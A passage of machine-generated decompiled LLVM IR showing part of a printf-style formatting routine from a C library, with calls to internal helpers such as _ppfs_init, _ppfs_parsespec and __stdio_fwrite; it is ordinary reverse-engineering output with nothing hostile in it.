  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %v4_804df02 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804df02, i32* @ebx, align 4
  %v2_804df0a = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804df0a, i32* @esi, align 4
  %v5_804df0f = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_804df02)
  store i32 %v5_804df0f, i32* %eax.global-to-local, align 4
  %v2_804df17 = icmp slt i32 %v5_804df0f, 0
  %v1_804df19 = icmp eq i1 %v2_804df17, false
  br i1 %v1_804df19, label %dec_label_pc_804df59, label %dec_label_pc_804df1b

dec_label_pc_804df1b:                             ; preds = %entry
  %v3_804df1b = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804df1b, i32* @ebx, align 4
  %v5_804df22 = inttoptr i32 %v3_804df1b to i8*
  %v3_804df23 = call i32 @strlen(i8* %v5_804df22)
  store i32 %v3_804df23, i32* %eax.global-to-local, align 4
  %v1_804df2b = icmp eq i32 %v3_804df23, 0
  store i32 -1, i32* %stack_var_-364, align 4
  br i1 %v1_804df2b, label %dec_label_pc_804e492, label %dec_label_pc_804df3a

dec_label_pc_804df3a:                             ; preds = %dec_label_pc_804df1b
  %v0_804df3a = load i32, i32* @edx, align 4
  %v0_804df43 = load i32, i32* @ebx, align 4
  %v6_804df44 = call i32 @__stdio_fwrite(i32 %v0_804df43, i32 %v3_804df23, i32 %arg1, i32 %v0_804df3a)
  store i32 %v6_804df44, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  br label %dec_label_pc_804e492

dec_label_pc_804df59:                             ; preds = %entry
  %v6_804df63 = call i32 @_ppfs_prepargs(i32 %v2_804df0a, i32 %arg3, i32 %v5_804df0f, i32 %v5_804df0f)
  store i32 %v6_804df63, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804df70 = load i32, i32* @ebx, align 4
  store i32 %v0_804df70, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804df78

dec_label_pc_804df77:                             ; preds = %dec_label_pc_804df7e
  %v1_804df77 = add i32 %v0_804df86, 1
  store i32 %v1_804df77, i32* @ebx, align 4
  br label %dec_label_pc_804df78.backedge

dec_label_pc_804df78.backedge:                    ; preds = %dec_label_pc_804df77, %dec_label_pc_804e478, %dec_label_pc_804e483
  %v1_804df8220 = phi i32 [ %v1_804df8a, %dec_label_pc_804df77 ], [ %v3_804e478, %dec_label_pc_804e478 ], [ %v1_804dfb6, %dec_label_pc_804e483 ]
  %v0_804df7818 = phi i32 [ %v1_804df77, %dec_label_pc_804df77 ], [ %v3_804e478, %dec_label_pc_804e478 ], [ %v1_804e483, %dec_label_pc_804e483 ]
  %v4_804df78.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804df78

dec_label_pc_804df78:                             ; preds = %dec_label_pc_804df78.backedge, %dec_label_pc_804df59
  %v1_804df8a = phi i32 [ %v1_804df8220, %dec_label_pc_804df78.backedge ], [ %v0_804df70, %dec_label_pc_804df59 ]
  %v0_804df86 = phi i32 [ %v0_804df7818, %dec_label_pc_804df78.backedge ], [ %v0_804df70, %dec_label_pc_804df59 ]
  %v4_804df78 = phi i32 [ %v4_804df78.pre, %dec_label_pc_804df78.backedge ], [ %v6_804df63, %dec_label_pc_804df59 ]
  %v1_804df78 = inttoptr i32 %v0_804df86 to i8*
  %v2_804df78 = load i8, i8* %v1_804df78, align 1
  %v3_804df78 = zext i8 %v2_804df78 to i32
  %v5_804df78 = and i32 %v4_804df78, -256
  %v6_804df78 = or i32 %v3_804df78, %v5_804df78
  store i32 %v6_804df78, i32* %eax.global-to-local, align 4
  %v4_804df7a = icmp eq i8 %v2_804df78, 0
  br i1 %v4_804df7a, label %dec_label_pc_804df82, label %dec_label_pc_804df7e

dec_label_pc_804df7e:                             ; preds = %dec_label_pc_804df78
  %v10_804df7e = icmp eq i8 %v2_804df78, 37
  %v1_804df80 = icmp eq i1 %v10_804df7e, false
  br i1 %v1_804df80, label %dec_label_pc_804df77, label %dec_label_pc_804df82

dec_label_pc_804df82:                             ; preds = %dec_label_pc_804df7e, %dec_label_pc_804df78
  %v2_804df82 = sub i32 %v0_804df86, %v1_804df8a
  %v12_804df82 = icmp eq i32 %v2_804df82, 0
  br i1 %v12_804df82, label %dec_label_pc_804dfad, label %dec_label_pc_804df86

dec_label_pc_804df86:                             ; preds = %dec_label_pc_804df82
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804df82, i32* @esi, align 4
  %tmp67 = icmp slt i32 %v2_804df82, 1
  br i1 %tmp67, label %dec_label_pc_804dfa2, label %dec_label_pc_804df90

dec_label_pc_804df90:                             ; preds = %dec_label_pc_804df86
  %v0_804df90 = load i32, i32* @ebp, align 4
  %v1_804df90 = load i32, i32* @esp, align 4
  %v2_804df90 = add i32 %v1_804df90, -4
  %v3_804df90 = inttoptr i32 %v2_804df90 to i32*
  store i32 %v0_804df90, i32* %v3_804df90, align 4
  %v1_804df91 = add i32 %v1_804df90, 368
  %v2_804df91 = inttoptr i32 %v1_804df91 to i32*
  %v3_804df91 = load i32, i32* %v2_804df91, align 4
  %v5_804df91 = add i32 %v1_804df90, -8
  %v6_804df91 = inttoptr i32 %v5_804df91 to i32*
  store i32 %v3_804df91, i32* %v6_804df91, align 4
  %v0_804df98 = load i32, i32* @esi, align 4
  %v2_804df98 = add i32 %v1_804df90, -12
  %v3_804df98 = inttoptr i32 %v2_804df98 to i32*
  store i32 %v0_804df98, i32* %v3_804df98, align 4
  %v0_804df99 = load i32, i32* %edx.global-to-local, align 4
  %v2_804df99 = add i32 %v1_804df90, -16
  %v3_804df99 = inttoptr i32 %v2_804df99 to i32*
  store i32 %v0_804df99, i32* %v3_804df99, align 4
  %v0_804df9a = load i32, i32* %stack_var_-364, align 4
  %v4_804df9a = call i32 @__stdio_fwrite(i32 %v0_804df9a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804df9a, i32* %eax.global-to-local, align 4
  %v1_804dfa2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804dfa2

dec_label_pc_804dfa2:                             ; preds = %dec_label_pc_804df86, %dec_label_pc_804df90
  %v3_804dfaa = phi i32 [ %v2_804df82, %dec_label_pc_804df86 ], [ %v1_804dfa2.pre, %dec_label_pc_804df90 ]
  %v0_804dfa2 = phi i32 [ 0, %dec_label_pc_804df86 ], [ %v4_804df9a, %dec_label_pc_804df90 ]
  %v12_804dfa2 = icmp eq i32 %v0_804dfa2, %v3_804dfaa
  %v1_804dfa4 = icmp eq i1 %v12_804dfa2, false
  %v0_804e48b.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804dfa4, label %dec_label_pc_804e48b, label %dec_label_pc_804dfaa

dec_label_pc_804dfaa:                             ; preds = %dec_label_pc_804dfa2
  %v1_804dfaa = inttoptr i32 %v0_804e48b.pre.pre to i32*
  %v2_804dfaa = load i32, i32* %v1_804dfaa, align 4
  %v4_804dfaa = add i32 %v2_804dfaa, %v3_804dfaa
  store i32 %v4_804dfaa, i32* %v1_804dfaa, align 4
  %v0_804dfad.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804dfad

dec_label_pc_804dfad:                             ; preds = %dec_label_pc_804df82, %dec_label_pc_804dfaa
  %v0_804e483 = phi i32 [ %v0_804df86, %dec_label_pc_804df82 ], [ %v0_804dfad.pre, %dec_label_pc_804dfaa ]
  %v1_804dfad = inttoptr i32 %v0_804e483 to i8*
  %v2_804dfad = load i8, i8* %v1_804dfad, align 1
  %v3_804dfad = icmp eq i8 %v2_804dfad, 0
  br i1 %v3_804dfad, label %dec_label_pc_804e492, label %dec_label_pc_804dfb6

dec_label_pc_804dfb6:                             ; preds = %dec_label_pc_804dfad
  %v1_804dfb6 = add i32 %v0_804e483, 1
  store i32 %v1_804dfb6, i32* %edx.global-to-local, align 4
  %v2_804dfb9 = inttoptr i32 %v1_804dfb6 to i8*
  %v3_804dfb9 = load i8, i8* %v2_804dfb9, align 1
  %v12_804dfb9 = icmp eq i8 %v3_804dfb9, 37
  br i1 %v12_804dfb9, label %dec_label_pc_804e483, label %dec_label_pc_804dfc3

dec_label_pc_804dfc3:                             ; preds = %dec_label_pc_804dfb6
  %v1_804dfc3 = load i32, i32* @esp, align 4
  %v2_804dfc3 = add i32 %v1_804dfc3, 16
  %v3_804dfc3 = inttoptr i32 %v2_804dfc3 to i32*
  store i32 %v1_804dfb6, i32* %v3_804dfc3, align 4
  %v0_804dfc7 = load i32, i32* @esp, align 4
  %v1_804dfc7 = add i32 %v0_804dfc7, 340
  %v2_804dfc7 = inttoptr i32 %v1_804dfc7 to i32*
  store i32 0, i32* %v2_804dfc7, align 4
  %v0_804dfd2 = load i32, i32* @esp, align 4
  %v1_804dfd5 = add i32 %v0_804dfd2, 16
  store i32 %v1_804dfd5, i32* @ebx, align 4
  %v2_804dfd9 = add i32 %v0_804dfd2, -16
  %v3_804dfd9 = inttoptr i32 %v2_804dfd9 to i32*
  store i32 %v1_804dfd5, i32* %v3_804dfd9, align 4
  %v0_804dfda = load i32, i32* %stack_var_-364, align 4
  %v1_804dfda = inttoptr i32 %v0_804dfda to i32*
  %v2_804dfda = call i32 @_ppfs_parsespec(i32* %v1_804dfda)
  store i32 %v2_804dfda, i32* %eax.global-to-local, align 4
  %v0_804dfdf = load i32, i32* @ebx, align 4
  %v1_804dfdf = load i32, i32* @esp, align 4
  %v2_804dfdf = inttoptr i32 %v1_804dfdf to i32*
  store i32 %v0_804dfdf, i32* %v2_804dfdf, align 4
  %v0_804dfe2 = load i32, i32* %stack_var_-364, align 4
  %v1_804dfe2 = call i32 @_ppfs_setargs(i32 %v0_804dfe2)
  store i32 %v1_804dfe2, i32* %eax.global-to-local, align 4
  %v0_804dfe7 = load i32, i32* @esp, align 4
  %v1_804dfe7 = add i32 %v0_804dfe7, 70
  %v2_804dfe7 = inttoptr i32 %v1_804dfe7 to i8*
  %v3_804dfe7 = load i8, i8* %v2_804dfe7, align 1
  %v4_804dfe7 = zext i8 %v3_804dfe7 to i32
  store i32 %v4_804dfe7, i32* @edi, align 4
  %v1_804dfec = add i32 %v0_804dfe7, 16
  %v1_804dfef = add i32 %v0_804dfe7, 56
  %v2_804dfef = inttoptr i32 %v1_804dfef to i32*
  %v3_804dfef = load i32, i32* %v2_804dfef, align 4
  %v1_804dff4 = add i32 %v0_804dfe7, 112
  store i32 %v1_804dff4, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_804dfef, 1
  br i1 %tmp68, label %dec_label_pc_804e001, label %dec_label_pc_804dffa

dec_label_pc_804dffa:                             ; preds = %dec_label_pc_804dfc3
  %v2_804dffa = zext i8 %v3_804dfe7 to i32
  %v3_804dffa = mul nuw nsw i32 %v2_804dffa, 12
  store i32 %v3_804dffa, i32* %eax.global-to-local, align 4
  %v2_804dffd = add i32 %v0_804dfe7, 100
  %v3_804dffd = add i32 %v2_804dffd, %v3_804dffa
  store i32 %v3_804dffd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e001

dec_label_pc_804e001:                             ; preds = %dec_label_pc_804dfc3, %dec_label_pc_804dffa
  %v0_804e00928 = phi i32 [ %v1_804dff4, %dec_label_pc_804dfc3 ], [ %v3_804dffd, %dec_label_pc_804dffa ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e003 = add i32 %v0_804dfe7, 60
  %v2_804e003 = inttoptr i32 %v1_804e003 to i32*
  %v3_804e003 = load i32, i32* %v2_804e003, align 4
  store i32 %v3_804e003, i32* %ecx.global-to-local, align 4
  %v2_804e01481 = sub i32 0, %v3_804e003
  %v10_804e01484 = and i32 %v3_804e003, %v2_804e01481
  %v11_804e01485 = icmp slt i32 %v10_804e01484, 0
  %v13_804e01486 = icmp slt i32 %v2_804e01481, 0
  %v2_804e01687 = icmp eq i1 %v13_804e01486, %v11_804e01485
  br i1 %v2_804e01687, label %dec_label_pc_804e018, label %dec_label_pc_804e009

dec_label_pc_804e009:                             ; preds = %dec_label_pc_804e001, %dec_label_pc_804e009
  %v0_804e01891 = phi i32 [ %v0_804e018, %dec_label_pc_804e009 ], [ %v1_804dfec, %dec_label_pc_804e001 ]
  %v2_804e00990 = phi i32 [ %v1_804e013, %dec_label_pc_804e009 ], [ 0, %dec_label_pc_804e001 ]
  %v0_804e00989 = phi i32 [ %v1_804e010, %dec_label_pc_804e009 ], [ %v0_804e00928, %dec_label_pc_804e001 ]
  %v3_804e009 = mul i32 %v2_804e00990, 4
  %v4_804e009 = add i32 %v0_804e01891, 344
  %v5_804e009 = add i32 %v4_804e009, %v3_804e009
  %v6_804e009 = inttoptr i32 %v5_804e009 to i32*
  store i32 %v0_804e00989, i32* %v6_804e009, align 4
  %v0_804e010 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e010 = add i32 %v0_804e010, 12
  store i32 %v1_804e010, i32* %edx.global-to-local, align 4
  %v0_804e013 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e013 = add i32 %v0_804e013, 1
  store i32 %v1_804e013, i32* %eax.global-to-local, align 4
  %v1_804e014.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e014 = sub i32 %v1_804e013, %v1_804e014.pre
  %v8_804e014 = xor i32 %v1_804e013, %v1_804e014.pre
  %v9_804e014 = xor i32 %v2_804e014, %v1_804e013
  %v10_804e014 = and i32 %v9_804e014, %v8_804e014
  %v11_804e014 = icmp slt i32 %v10_804e014, 0
  %v13_804e014 = icmp slt i32 %v2_804e014, 0
  %v2_804e016 = icmp eq i1 %v13_804e014, %v11_804e014
  %v0_804e018 = load i32, i32* @esp, align 4
  br i1 %v2_804e016, label %dec_label_pc_804e018, label %dec_label_pc_804e009

dec_label_pc_804e018:                             ; preds = %dec_label_pc_804e009, %dec_label_pc_804e001
  %v0_804e018.lcssa = phi i32 [ %v1_804dfec, %dec_label_pc_804e001 ], [ %v0_804e018, %dec_label_pc_804e009 ]
  %v1_804e018 = add i32 %v0_804e018.lcssa, 48
  %v2_804e018 = inttoptr i32 %v1_804e018 to i32*
  %v3_804e018 = load i32, i32* %v2_804e018, align 4
  store i32 %v3_804e018, i32* @ecx, align 4
  %v1_804e01c = icmp eq i32 %v3_804e018, 0
  %v1_804e01e = icmp eq i1 %v1_804e01c, false
  br i1 %v1_804e01e, label %dec_label_pc_804e046, label %dec_label_pc_804e020

dec_label_pc_804e020:                             ; preds = %dec_label_pc_804e018
  %v1_804e020 = inttoptr i32 %v0_804e018.lcssa to i32*
  %v2_804e020 = load i32, i32* %v1_804e020, align 4
  store i32 %v2_804e020, i32* %eax.global-to-local, align 4
  %v1_804e023 = ashr i32 %v2_804e020, 31
  store i32 %v1_804e023, i32* %edx.global-to-local, align 4
  %v2_804e024 = add i32 %v0_804e018.lcssa, -4
  %v3_804e024 = inttoptr i32 %v2_804e024 to i32*
  store i32 %v1_804e023, i32* %v3_804e024, align 4
  %v0_804e025 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e025 = add i32 %v0_804e018.lcssa, -8
  %v3_804e025 = inttoptr i32 %v2_804e025 to i32*
  store i32 %v0_804e025, i32* %v3_804e025, align 4
  %v1_804e026 = add i32 %v0_804e018.lcssa, 32
  %v2_804e026 = inttoptr i32 %v1_804e026 to i32*
  %v3_804e026 = load i32, i32* %v2_804e026, align 4
  %v1_804e02a = and i32 %v3_804e026, 3840
  store i32 %v1_804e02a, i32* %eax.global-to-local, align 4
  %v2_804e02f = add i32 %v0_804e018.lcssa, -12
  %v3_804e02f = inttoptr i32 %v2_804e02f to i32*
  store i32 %v1_804e02a, i32* %v3_804e02f, align 4
  %v1_804e030 = add i32 %v0_804e018.lcssa, 344
  %v2_804e030 = inttoptr i32 %v1_804e030 to i32*
  %v3_804e030 = load i32, i32* %v2_804e030, align 4
  store i32 %v3_804e030, i32* %eax.global-to-local, align 4
  %v1_804e037 = inttoptr i32 %v3_804e030 to i32*
  %v2_804e037 = load i32, i32* %v1_804e037, align 4
  %v4_804e037 = add i32 %v0_804e018.lcssa, -16
  %v5_804e037 = inttoptr i32 %v4_804e037 to i32*
  store i32 %v2_804e037, i32* %v5_804e037, align 4
  %v0_804e039 = call i32 @_store_inttype()
  store i32 %v0_804e039, i32* %eax.global-to-local, align 4
  %v0_804e03e = load i32, i32* @esp, align 4
  %v1_804e03e = add i32 %v0_804e03e, 16
  br label %dec_label_pc_804e478

dec_label_pc_804e046:                             ; preds = %dec_label_pc_804e018
  %tmp94 = icmp ult i32 %v3_804e018, 8
  br i1 %tmp94, label %dec_label_pc_804e04f, label %dec_label_pc_804e1b0

dec_label_pc_804e04f:                             ; preds = %dec_label_pc_804e046
  %v1_804e04f = add i32 %v3_804e018, 134547864
  %v2_804e04f = inttoptr i32 %v1_804e04f to i8*
  %v3_804e04f = load i8, i8* %v2_804e04f, align 1
  %v4_804e04f = sext i8 %v3_804e04f to i32
  store i32 %v4_804e04f, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804e05b = icmp eq i8 %v3_804e04f, 10
  %v1_804e05e = icmp eq i1 %v9_804e05b, false
  br i1 %v1_804e05e, label %dec_label_pc_804e07c, label %dec_label_pc_804e060

dec_label_pc_804e060:                             ; preds = %dec_label_pc_804e04f
  %v1_804e060 = add i32 %v0_804e018.lcssa, 32
  %v2_804e060 = inttoptr i32 %v1_804e060 to i32*
  %v3_804e060 = load i32, i32* %v2_804e060, align 4
  %v1_804e066 = and i32 %v3_804e060, 32
  store i32 %v1_804e066, i32* %eax.global-to-local, align 4
  %tmp69 = udiv i32 %v1_804e066, 32
  %tmp70 = sub nsw i32 45, %tmp69
  store i32 %tmp70, i32* @ebx, align 4
  %v1_804e074 = trunc i32 %v3_804e060 to i8
  %v2_804e074 = and i8 %v1_804e074, 64
  %v3_804e074 = icmp eq i8 %v2_804e074, 0
  %v5_804e074 = zext i8 %v2_804e074 to i32
  %v7_804e074 = and i32 %v3_804e060, -256
  %v8_804e074 = or i32 %v5_804e074, %v7_804e074
  store i32 %v8_804e074, i32* %edx.global-to-local, align 4
  br i1 %v3_804e074, label %dec_label_pc_804e07c, label %dec_label_pc_804e079

dec_label_pc_804e079:                             ; preds = %dec_label_pc_804e060
  %v2_804e079 = or i32 %tmp70, 128
  store i32 %v2_804e079, i32* @ebx, align 4
  br label %dec_label_pc_804e07c

dec_label_pc_804e07c:                             ; preds = %dec_label_pc_804e060, %dec_label_pc_804e04f, %dec_label_pc_804e079
  %tmp95 = icmp ult i32 %v3_804e018, 6
  br i1 %tmp95, label %dec_label_pc_804e081, label %dec_label_pc_804e099

dec_label_pc_804e081:                             ; preds = %dec_label_pc_804e07c
  %v9_804e081 = icmp eq i32 %v3_804e018, 3
  %v1_804e084 = icmp eq i1 %v9_804e081, false
  br i1 %v1_804e084, label %dec_label_pc_804e08d, label %dec_label_pc_804e086

dec_label_pc_804e086:                             ; preds = %dec_label_pc_804e081
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804e09b

dec_label_pc_804e08d:                             ; preds = %dec_label_pc_804e081
  %v9_804e092 = icmp eq i32 %v3_804e018, 1
  br i1 %v9_804e092, label %dec_label_pc_804e0a0, label %dec_label_pc_804e09b

dec_label_pc_804e099:                             ; preds = %dec_label_pc_804e07c
  %v1_804e099 = sub nsw i32 0, %v4_804e04f
  store i32 %v1_804e099, i32* @esi, align 4
  br label %dec_label_pc_804e09b

dec_label_pc_804e09b:                             ; preds = %dec_label_pc_804e08d, %dec_label_pc_804e086, %dec_label_pc_804e099
  br label %dec_label_pc_804e0a0

dec_label_pc_804e0a0:                             ; preds = %dec_label_pc_804e08d, %dec_label_pc_804e09b
  %storemerge106 = phi i32 [ 11, %dec_label_pc_804e09b ], [ 6, %dec_label_pc_804e08d ]
  store i32 %storemerge106, i32* @ebp, align 4
  %v1_804e0a0 = add i32 %v0_804e018.lcssa, 7
  %v2_804e0a0 = inttoptr i32 %v1_804e0a0 to i8*
  store i8 32, i8* %v2_804e0a0, align 1
  %v0_804e0a5 = load i32, i32* @esp, align 4
  %v1_804e0a5 = add i32 %v0_804e0a5, 20
  %v2_804e0a5 = inttoptr i32 %v1_804e0a5 to i32*
  %v3_804e0a5 = load i32, i32* %v2_804e0a5, align 4
  %v5_804e0a5 = icmp slt i32 %v3_804e0a5, 0
  %v1_804e0aa = icmp eq i1 %v5_804e0a5, false
  br i1 %v1_804e0aa, label %dec_label_pc_804e0b4, label %dec_label_pc_804e0ac

dec_label_pc_804e0ac:                             ; preds = %dec_label_pc_804e0a0
  %v1_804e0ac = add i32 %v0_804e0a5, 36
  %v2_804e0ac = inttoptr i32 %v1_804e0ac to i8*
  %v3_804e0ac = load i8, i8* %v2_804e0ac, align 1
  %v4_804e0ac = zext i8 %v3_804e0ac to i32
  %v5_804e0ac = load i32, i32* %edx.global-to-local, align 4
  %v6_804e0ac = and i32 %v5_804e0ac, -256
  %v7_804e0ac = or i32 %v6_804e0ac, %v4_804e0ac
  store i32 %v7_804e0ac, i32* %edx.global-to-local, align 4
  %v3_804e0b0 = add i32 %v0_804e0a5, 7
  %v4_804e0b0 = inttoptr i32 %v3_804e0b0 to i8*
  store i8 %v3_804e0ac, i8* %v4_804e0b0, align 1
  %v0_804e0b4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e0b4

dec_label_pc_804e0b4:                             ; preds = %dec_label_pc_804e0a0, %dec_label_pc_804e0ac
  %v1_804e0cd = phi i32 [ %v0_804e0a5, %dec_label_pc_804e0a0 ], [ %v0_804e0b4.pre, %dec_label_pc_804e0ac ]
  %v1_804e0b4 = add i32 %v1_804e0cd, 344
  %v2_804e0b4 = inttoptr i32 %v1_804e0b4 to i32*
  %v3_804e0b4 = load i32, i32* %v2_804e0b4, align 4
  store i32 %v3_804e0b4, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_804e0c0 = add i32 %v3_804e018, -1
  %v8_804e0c0 = icmp eq i32 %v1_804e0c0, 0
  store i32 %v1_804e0c0, i32* %ecx.global-to-local, align 4
  %v0_804e0cd.pre = load i32, i32* @edi, align 4
  br i1 %v8_804e0c0, label %dec_label_pc_804e0cd, label %dec_label_pc_804e0c3

dec_label_pc_804e0c3:                             ; preds = %dec_label_pc_804e0b4
  %v2_804e0c3 = mul i32 %v0_804e0cd.pre, 4
  %v3_804e0c3 = add i32 %v1_804e0cd, 52
  %v4_804e0c3 = add i32 %v3_804e0c3, %v2_804e0c3
  %v5_804e0c3 = inttoptr i32 %v4_804e0c3 to i32*
  %v6_804e0c3 = load i32, i32* %v5_804e0c3, align 4
  %v1_804e0c7 = and i32 %v6_804e0c3, 3840
  store i32 %v1_804e0c7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e0cd

dec_label_pc_804e0cd:                             ; preds = %dec_label_pc_804e0b4, %dec_label_pc_804e0c3
  %v2_804e0cd = add i32 %v1_804e0cd, -4
  %v3_804e0cd = inttoptr i32 %v2_804e0cd to i32*
  store i32 %v0_804e0cd.pre, i32* %v3_804e0cd, align 4
  %v0_804e0ce = load i32, i32* @esi, align 4
  %v2_804e0ce = add i32 %v1_804e0cd, -8
  %v3_804e0ce = inttoptr i32 %v2_804e0ce to i32*
  store i32 %v0_804e0ce, i32* %v3_804e0ce, align 4
  %v0_804e0cf = load i32, i32* %eax.global-to-local, align 4
  %v2_804e0cf = add i32 %v1_804e0cd, -12
  %v3_804e0cf = inttoptr i32 %v2_804e0cf to i32*
  store i32 %v0_804e0cf, i32* %v3_804e0cf, align 4
  %v0_804e0d0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e0d0 = add i32 %v1_804e0cd, -16
  %v3_804e0d0 = inttoptr i32 %v2_804e0d0 to i32*
  store i32 %v0_804e0d0, i32* %v3_804e0d0, align 4
  %v0_804e0d1 = call i32 @_load_inttype()
  %v0_804e0d6 = load i32, i32* @ebx, align 4
  %v1_804e0d6 = load i32, i32* @esp, align 4
  %v2_804e0d6 = inttoptr i32 %v1_804e0d6 to i32*
  store i32 %v0_804e0d6, i32* %v2_804e0d6, align 4
  %v0_804e0d9 = load i32, i32* @esi, align 4
  %v1_804e0d9 = load i32, i32* @esp, align 4
  %v2_804e0d9 = add i32 %v1_804e0d9, -4
  %v3_804e0d9 = inttoptr i32 %v2_804e0d9 to i32*
  store i32 %v0_804e0d9, i32* %v3_804e0d9, align 4
  %v0_804e0da = load i32, i32* @edx, align 4
  %v2_804e0da = add i32 %v1_804e0d9, -8
  %v3_804e0da = inttoptr i32 %v2_804e0da to i32*
  store i32 %v0_804e0da, i32* %v3_804e0da, align 4
  %v2_804e0db = add i32 %v1_804e0d9, -12
  %v3_804e0db = inttoptr i32 %v2_804e0db to i32*
  store i32 %v0_804e0d1, i32* %v3_804e0db, align 4
  %v1_804e0dc = add i32 %v1_804e0d9, 347
  store i32 %v1_804e0dc, i32* %eax.global-to-local, align 4
  %v2_804e0e3 = add i32 %v1_804e0d9, -16
  %v3_804e0e3 = inttoptr i32 %v2_804e0e3 to i32*
  store i32 %v1_804e0dc, i32* %v3_804e0e3, align 4
  %v0_804e0e4 = load i32, i32* %stack_var_-364, align 4
  %v5_804e0e4 = inttoptr i32 %v0_804e0e4 to i8*
  %v6_804e0e4 = call i32 @_uintmaxtostr(i8* %v5_804e0e4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804e0e4, i32* %eax.global-to-local, align 4
  %v0_804e0e9 = load i32, i32* @esp, align 4
  %v1_804e0e9 = add i32 %v0_804e0e9, 32
  store i32 %v6_804e0e4, i32* @edi, align 4
  %v1_804e0ee = add i32 %v0_804e0e9, 80
  %v2_804e0ee = inttoptr i32 %v1_804e0ee to i32*
  %v3_804e0ee = load i32, i32* %v2_804e0ee, align 4
  %tmp96 = icmp ult i32 %v3_804e0ee, 6
  br i1 %tmp96, label %dec_label_pc_804e11c, label %dec_label_pc_804e0f5

dec_label_pc_804e0f5:                             ; preds = %dec_label_pc_804e0cd
  %v1_804e0f5 = inttoptr i32 %v6_804e0e4 to i8*
  %v2_804e0f5 = load i8, i8* %v1_804e0f5, align 1
  %v11_804e0f5 = icmp eq i8 %v2_804e0f5, 45
  %v1_804e0f8 = icmp eq i1 %v11_804e0f5, false
  %v1_804e107 = add i32 %v0_804e0e9, 64
  %v2_804e107 = inttoptr i32 %v1_804e107 to i32*
  %v3_804e107 = load i32, i32* %v2_804e107, align 4
  br i1 %v1_804e0f8, label %dec_label_pc_804e107, label %dec_label_pc_804e0fa

dec_label_pc_804e0fa:                             ; preds = %dec_label_pc_804e0f5
  %v4_804e0fa = or i32 %v3_804e107, 2
  store i32 %v4_804e0fa, i32* %v2_804e107, align 4
  %v0_804e0ff = load i32, i32* @edi, align 4
  %v1_804e0ff = add i32 %v0_804e0ff, 1
  store i32 %v1_804e0ff, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804e11c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e11c

dec_label_pc_804e107:                             ; preds = %dec_label_pc_804e0f5
  store i32 %v3_804e107, i32* %eax.global-to-local, align 4
  %v2_804e10b = and i32 %v3_804e107, 2
  %v3_804e10b = icmp eq i32 %v2_804e10b, 0
  br i1 %v3_804e10b, label %dec_label_pc_804e113, label %dec_label_pc_804e10f

dec_label_pc_804e10f:                             ; preds = %dec_label_pc_804e107
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804e11c

dec_label_pc_804e113:                             ; preds = %dec_label_pc_804e107
  %v2_804e113 = urem i32 %v3_804e107, 2
  %v3_804e113 = icmp eq i32 %v2_804e113, 0
  br i1 %v3_804e113, label %dec_label_pc_804e11c, label %dec_label_pc_804e117

dec_label_pc_804e117:                             ; preds = %dec_label_pc_804e113
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_804e11c

dec_label_pc_804e11c:                             ; preds = %dec_label_pc_804e113, %dec_label_pc_804e0cd, %dec_label_pc_804e10f, %dec_label_pc_804e0fa, %dec_label_pc_804e117
  %v0_804e16f = phi i32 [ %v6_804e0e4, %dec_label_pc_804e113 ], [ %v6_804e0e4, %dec_label_pc_804e0cd ], [ %v6_804e0e4, %dec_label_pc_804e10f ], [ %v1_804e0ff, %dec_label_pc_804e0fa ], [ %v6_804e0e4, %dec_label_pc_804e117 ]
  %v0_804e17e = phi i32 [ %v1_804e0e9, %dec_label_pc_804e113 ], [ %v1_804e0e9, %dec_label_pc_804e0cd ], [ %v1_804e0e9, %dec_label_pc_804e10f ], [ %v0_804e11c.pre, %dec_label_pc_804e0fa ], [ %v1_804e0e9, %dec_label_pc_804e117 ]
  %v1_804e11c = add i32 %v0_804e17e, 204
  store i32 %v1_804e11c, i32* %ecx.global-to-local, align 4
  %v1_804e123 = add i32 %v0_804e17e, 20
  %v2_804e123 = inttoptr i32 %v1_804e123 to i32*
  %v3_804e123 = load i32, i32* %v2_804e123, align 4
  store i32 %v3_804e123, i32* %edx.global-to-local, align 4
  %v2_804e127 = sub i32 %v1_804e11c, %v0_804e16f
  store i32 %v2_804e127, i32* %ecx.global-to-local, align 4
  %v2_804e129 = icmp slt i32 %v3_804e123, 0
  %v1_804e12b = add i32 %v2_804e127, 127
  store i32 %v1_804e12b, i32* @esi, align 4
  %v1_804e12e = icmp eq i1 %v2_804e129, false
  br i1 %v1_804e12e, label %dec_label_pc_804e135, label %dec_label_pc_804e130

dec_label_pc_804e130:                             ; preds = %dec_label_pc_804e11c
  store i32 1, i32* %edx.global-to-local, align 4
